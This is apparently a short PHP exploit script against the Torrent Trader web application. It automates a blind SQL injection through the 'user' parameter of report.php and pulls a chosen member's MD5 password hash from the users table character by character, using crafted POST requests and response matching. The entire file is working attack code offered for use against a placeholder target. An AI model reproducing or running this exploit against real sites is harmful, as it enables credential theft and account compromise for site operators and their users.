<?php


error_reporting(0);

	$member = 'XXX';
	$keychar = '1234567890abcdef';
	
	print "\n\n[*] Exploit for Torrent Trader\n\n";
	print "[*] Vuln : report.php\n\n";
	
	print "[*] MD5 :";
	
	for ($id = 1; $id <= 32; $id++)
	{
	
		for ($i = 0; $i < strlen($keychar); $i++)
		{
			
			$ascii = ord($keychar[$i]);
			
			$lpszDatas = "user=1+AND+ASCII%28MID%28%28SELECT+password+FROM+users+WHERE+id%3D".$member."%29%2C".$id."%2C1%29%29%3D".$ascii."+OR+1%3D2&reason=%27";
			
			$ch = curl_init();
			curl_setopt ($ch, CURLOPT_URL, '[TARGET]/report.php');
			curl_setopt ($ch, CURLOPT_POSTFIELDS, $lpszDatas);
			curl_setopt ($ch, CURLOPT_COOKIE,'pass=xxxxx');
			curl_setopt ($ch, CURLOPT_RETURNTRANSFER, true);
			$page = curl_exec($ch);
			
			if (!strstr($page,'Successfully Reported'))
			{
				echo chr($ascii);
				break;
			}
			
		}
	}
	
